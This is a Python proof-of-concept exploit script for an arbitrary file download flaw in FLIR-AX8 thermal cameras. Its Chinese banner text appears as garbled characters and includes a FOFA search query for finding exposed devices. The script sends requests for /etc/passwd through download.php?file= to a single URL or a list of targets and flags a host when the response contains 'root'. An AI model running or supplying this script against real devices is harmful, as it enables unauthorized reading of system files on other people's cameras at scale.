#!/usr/bin/python
#coding=GBK
import  requests
from argparse import ArgumentParser
def info(title,fofa):
    print("-------------------------------------------------")
    print("FIRL-AXR �����ļ�����POC|                          |")
    print("���ð汾: FLIR-AX8                                |")
    print("author:ľ��                                      |")
    print("�ýű���������֤©�����ڣ����������κ�Υ����;��          |")
    print("  FOFA:app='FLIR-FLIR-AX8'                       |")
    print("-------------------------------------------------")
def poc(url,payload="/etc/passwd"):
    path ="/download.php?file={}".format(payload)
    urls  = url + path
    try:
        resp = requests.get(urls, verify=False)
        if 'root' in resp.text:
            print(url + "���������ļ�����©��")
        else:
            print(url + "�����������ļ�����©��")

    except BaseException as e :
        pass



if __name__ == '__main__':
    group =ArgumentParser()
    group.add_argument('-u','--url',type=str,help="input url")
    group.add_argument('-f','--File',type=str,help="input file")
    args = group.parse_args()
    if args.url:
        url = args.url
        poc(url)
    elif args.File:
        filename = args.File
        print(filename)
        with open(filename,'r')as e:
            files = e.readlines()
            for file in files:
                if not (file.startswith("http") or file.startswith("https")):
                    file = "http://"+file
                    poc(file.strip())
                else:
                    poc(file)

